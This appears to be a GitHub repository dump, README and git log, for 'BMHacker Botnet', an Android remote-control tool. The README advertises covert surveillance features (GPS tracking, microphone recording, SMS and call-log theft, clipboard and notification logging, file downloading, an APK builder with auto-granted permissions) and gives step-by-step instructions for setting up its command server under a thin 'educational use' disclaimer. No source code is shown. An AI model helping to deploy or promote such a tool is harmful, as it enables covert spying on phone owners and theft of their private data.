@@ -1,0 +1,233 @@
+======================: FILES :======================
+======================: README CONTENT :======================
+<p align="center">
+<img src="https://github.com/bmh1cker/BMHacker-Botnet/blob/master/assets/webpublic/logo.png" height="60"><br>
+A cloud based remote android managment suite, powered by NodeJS
+</p>
+
+
+
+## Features
+- GPS Logging
+- Microphone Recording
+- View Contacts
+- SMS Logs
+- Send SMS
+- Call Logs
+- View Installed Apps
+- View Stub Permissions
+- Live Clipboard Logging
+- Live Notification Logging
+- View WiFi Networks (logs previously seen)
+- File Explorer & Downloader
+- Command Queuing
+- Built In APK Builder
+- Auto Allow Permission
+
+## Prerequisites 
+ - Java Runtime Environment 8
+    - See [installation](#Installation) for OS specifics
+ - NodeJs 
+ - A Server
+
+## Installation 
+1. Install JRE 8 
+    - Debian, Ubuntu, Etc
+        - `sudo apt-get install openjdk-8-jre`
+    - Fedora, Oracle, Red Hat, etc
+        -  `su -c "yum install java-1.8.0-openjdk"`
+    - Windows 
+        - click [HERE](https://www.oracle.com/technetwork/java/javase/downloads/jre8-downloads-2133155.html) for downloads
+
+2. Install NodeJS [Instructions Here](https://nodejs.org/en/download/package-manager/) (If you can't figure this out, you shouldn't really be using this)
+
+3. install PM2 
+    - `npm install pm2 -g`
+
+4. Download and Extract [HERE](https://codeload.github.com/bmh1cker/BMHacker-Botnet/zip/master)
+
+5. In the extracted folder, run these commands
+    - `npm install` <- install dependencies
+    - `pm2 start index.js` <-- start the script
+    - `pm2 startup` <- to run botnet on startup
+
+6. Default Username & Password
+    - Username: admin
+    - Password: admin
+    
+7. Set Username & Password Manually  
+    1. Stop botnet `pm2 stop index`
+    2. Open `maindb.json` in a text editor
+    3. under `admin` 
+        - set the `username` as plain text
+        - set the `password` as a LOWERCASE MD5 hash
+    4. save the file
+    5. run `pm2 restart all`
+
+8. in your browser navigate to `http://<SERVER IP>:22533`
+    
+It's recommended to run botnet behind a reverse proxy such as [NGINX](https://www.nginx.com/resources/wiki/start/topics/tutorials/install/)
+
+## Watch Practical Video
+- Part(1)-> https://youtu.be/wjmYOW_NtmE
+- Part(2)-> https://youtu.be/geLg46vNFKE
+- Part(3)-> https://youtu.be/R3_37GgI1IQ
+
+## Disclaimer
+<b>BMHacker Botnet Provides no warranty with this software and will not be responsible for any direct or indirect damage caused due to the usage of this tool.<br>
+BMHacker Botnet is built for both Educational and Internal use ONLY.</b>
+
+<br>
+<p align="center">Made By <a href="//h1ckpro.tk">BM Hacker</a></p>     
+<p align="center" style="font-size: 8px">v1.1.0</p>
+
+## 🔗 ***Check this***
+
+### Subscribe our channel on youtube:
+https://www.youtube.com/BMHacker
+
+### Chekout our webite:
+https://h1ckpro.tk
+
+## 👥 ***Join***
+
+### Telegram channel:
+https://t.me/bmh1cker
+
+### Facebook page:
+https://www.facebook.com/bmh1cker
+
+### Instagram: 
+https://www.instagram.com/bmh1cker
+
+Inspired by L3MON (https://github.com/D3VL/L3MON)
+====================== GIT HISTORY: ======================
+8d4e926 HEAD@{0}: clone: from https://github.com/bmh1cker/BMHacker-Botnet
+commit 8d4e92656d0d7d735fedd904bb51c116ad7e7803
+Merge: 1240850 4559cf1
+Author: BM Hacker <62347217+bmh1cker@users.noreply.github.com>
+Date:   Wed Feb 17 02:38:41 2021 +0530
+
+    Merge pull request #1 from bmh1cker/dependabot/npm_and_yarn/lodash-4.17.19
+    
+    Bump lodash from 4.17.15 to 4.17.19
+
+commit 124085003f414a25724c4ccf0f46d5dd20973ca9
+Author: BM Hacker <62347217+bmh1cker@users.noreply.github.com>
+Date:   Wed Feb 17 02:38:25 2021 +0530
+
+    Create SECURITY.md
+
+commit 1c0e52300efa1d5b81f801db0e31c044097c0422
+Merge: 3bbb08f 1b3bd4d
+Author: BM Hacker <62347217+bmh1cker@users.noreply.github.com>
+Date:   Wed Feb 17 02:38:07 2021 +0530
+
+    Merge pull request #2 from bmh1cker/dependabot/npm_and_yarn/socket.io-2.4.0
+    
+    Bump socket.io from 2.2.0 to 2.4.0
+
+commit 1b3bd4d0aa449931aa9818303a5bae972d0a4b03
+Author: dependabot[bot] <49699333+dependabot[bot]@users.noreply.github.com>
+Date:   Thu Jan 21 14:38:23 2021 +0000
+
+    Bump socket.io from 2.2.0 to 2.4.0
+    
+    Bumps [socket.io](https://github.com/socketio/socket.io) from 2.2.0 to 2.4.0.
+    - [Release notes](https://github.com/socketio/socket.io/releases)
+    - [Changelog](https://github.com/socketio/socket.io/blob/2.4.0/CHANGELOG.md)
+    - [Commits](https://github.com/socketio/socket.io/compare/2.2.0...2.4.0)
+    
+    Signed-off-by: dependabot[bot] <support@github.com>
+
+commit 4559cf190f0f1e583a8c2c35c9aa4d3b46d44227
+Author: dependabot[bot] <49699333+dependabot[bot]@users.noreply.github.com>
+Date:   Mon Jul 20 04:05:51 2020 +0000
+
+    Bump lodash from 4.17.15 to 4.17.19
+    
+    Bumps [lodash](https://github.com/lodash/lodash) from 4.17.15 to 4.17.19.
+    - [Release notes](https://github.com/lodash/lodash/releases)
+    - [Commits](https://github.com/lodash/lodash/compare/4.17.15...4.17.19)
+    
+    Signed-off-by: dependabot[bot] <support@github.com>
+
+commit 3bbb08f33d466d1de4a55f00d9fe2fdccb48f6b2
+Author: BM Hacker <62347217+bmh1cker@users.noreply.github.com>
+Date:   Thu May 7 13:25:12 2020 +0530
+
+    Update README.md
+
+commit 2971e6569c6b34cf5aa778d333e8abd043f204d5
+Author: BM Hacker <62347217+bmh1cker@users.noreply.github.com>
+Date:   Sat Apr 11 21:09:22 2020 +0530
+
+    Update README.md
+
+commit 206b6fce65ec58b1418a10cb089845206786b69e
+Author: BM Hacker <62347217+bmh1cker@users.noreply.github.com>
+Date:   Fri Apr 10 19:14:51 2020 +0530
+
+    Update README.md
+
+commit e3d58aa7378efd410eac5e3cd3fee0a5afc76ec1
+Author: BM Hacker <62347217+bmh1cker@users.noreply.github.com>
+Date:   Fri Apr 10 08:32:18 2020 +0530
+
+    Update README.md
+
+commit 5217bee298334a80ba1666fb7da8d9592e3acdb9
+Author: BM Hacker <62347217+bmh1cker@users.noreply.github.com>
+Date:   Fri Apr 10 08:21:01 2020 +0530
+
+    Update README.md
+
+commit e52bb8328735c32d993ee5004eba6ad863cedef3
+Author: BM Hacker <62347217+bmh1cker@users.noreply.github.com>
+Date:   Thu Apr 9 23:10:13 2020 +0530
+
+    Add files via upload
+    
+    Update New logo of BM Hacker
+
+commit 5ae5d7c03eb9d8782c0e2c6e65e1b5fd79392701
+Author: BM Hacker <62347217+bmh1cker@users.noreply.github.com>
+Date:   Thu Apr 9 23:08:35 2020 +0530
+
+    Delete logo.png
+
+commit ea5c865fac18f4c0b4a046aedf3df9f07c6a912a
+Author: BM Hacker <62347217+bmh1cker@users.noreply.github.com>
+Date:   Thu Apr 9 23:00:55 2020 +0530
+
+    Update head.ejs
+
+commit 0b40ce1fdf41d3e462213a3943b75b0b9f3857ca
+Author: BM Hacker <62347217+bmh1cker@users.noreply.github.com>
+Date:   Thu Apr 9 22:42:27 2020 +0530
+
+    Update new logo of bm hacker
+
+commit 1c0c002c05b76bde182dddb25f2f6363e78b137b
+Author: BM Hacker <62347217+bmh1cker@users.noreply.github.com>
+Date:   Thu Apr 9 22:40:18 2020 +0530
+
+    Delete logo.png
+
+commit fb631d25e1b2a1a24b0b67c2694dd2cdacbf829f
+Author: BM Hacker <62347217+bmh1cker@users.noreply.github.com>
+Date:   Sun Apr 5 17:09:06 2020 +0530
+
+    Update README.md
+
+commit 601d63da849a02cd9cf3be061c07de1293baddd7
+Author: BM Hacker <62347217+bmh1cker@users.noreply.github.com>
+Date:   Sun Apr 5 17:04:58 2020 +0530
+
+    Update README.md
+
+commit 212de13629c3e8c64a6aedcc7f6e0da758c88211
+Author: bmh1cker <bmh1cker@gmail.com>
+Date:   Sun Apr 5 17:01:41 2020 +0530
+
+    BM Hacker Botnet
